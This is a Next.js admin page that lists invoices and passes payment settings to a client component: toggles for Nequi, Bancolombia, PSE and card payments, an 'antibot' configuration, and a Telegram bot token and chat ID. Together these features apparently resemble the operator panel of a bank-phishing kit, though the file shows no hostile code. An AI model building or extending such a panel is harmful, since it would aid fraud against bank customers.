import { redirect } from "next/navigation";
import { readSession } from "@/lib/session";
import { preloadSettings, Setting } from "@/lib/settings";
import { getBancosPseSettings } from "@/lib/bancos";
import { listFacturas } from "@/lib/facturas-cache";
import { mergedAntibotConfig } from "@/lib/antibots/config";
import CrudIndexClient from "./CrudIndexClient";

export const dynamic = "force-dynamic";

export default async function CrudIndexPage({
  searchParams,
}: {
  searchParams: Promise<{ q?: string; page?: string }>;
}) {
  const session = await readSession();
  if (!session.cargarAuth) redirect("/crud/login");

  await preloadSettings();
  const sp = await searchParams;
  const q = String(sp.q || "").trim();
  const page = parseInt(String(sp.page || "1"), 10) || 1;

  const facturas = await listFacturas({ page, perPage: 20, search: q });
  const antibot = await mergedAntibotConfig();

  return (
    <CrudIndexClient
      facturas={facturas}
      filtros={{ q }}
      nequiEnabled={Setting.getBool("nequi_enabled", true)}
      bancolombiaEnabled={Setting.getBool("bancolombia_enabled", false)}
      pseEnabled={Setting.getBool("pse_enabled", true)}
      tarjetaEnabled={Setting.getBool("tarjeta_enabled", true)}
      bancosPse={getBancosPseSettings()}
      antibot={antibot}
      telegramBotToken={Setting.getString("telegram_bot_token", "")}
      telegramChatId={Setting.getString("telegram_chat_id", "")}
    />
  );
}
